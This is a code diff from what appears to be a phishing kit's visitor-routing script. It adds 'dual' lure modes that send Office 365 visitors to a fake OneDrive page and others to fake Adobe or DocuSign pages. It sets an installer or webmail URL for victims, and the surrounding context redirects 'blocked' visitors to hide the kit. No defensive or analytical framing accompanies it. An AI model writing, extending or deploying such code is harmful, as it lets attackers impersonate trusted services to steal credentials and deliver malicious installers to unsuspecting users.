@@ -312,10 +312,25 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
     }
   } else {
     const style = (cfg.page_style || 'adobe').toLowerCase();
-    if      (style === 'onedrive')  targetPage = 'OneDrive.html';
-    else if (style === 'docusign')  targetPage = 'docs.html';
-    else                            targetPage = 'index.html';
-    if (cfg.installer_enabled) window._installerUrl = installerUrl;
+    if (style === 'onedrive') {
+      targetPage = 'OneDrive.html';
+    } else if (style === 'docusign') {
+      targetPage = 'docs.html';
+    } else if (style === 'dual-adobe-onedrive') {
+      // page_style carries dual value but landing_mode arrived as 'single' — apply dual routing
+      targetPage = isO365 ? 'OneDrive.html' : 'index.html';
+      if (cfg.installer_enabled) {
+        window._installerUrl = isO365 ? installerUrl : webmailUrl;
+      }
+    } else if (style === 'dual-docusign-onedrive') {
+      targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
+      if (cfg.installer_enabled) {
+        window._installerUrl = isO365 ? installerUrl : webmailUrl;
+      }
+    } else {
+      targetPage = 'index.html';
+    }
+    if (cfg.installer_enabled && !window._installerUrl) window._installerUrl = installerUrl;
   }
 
   if (window._installerUrl) {
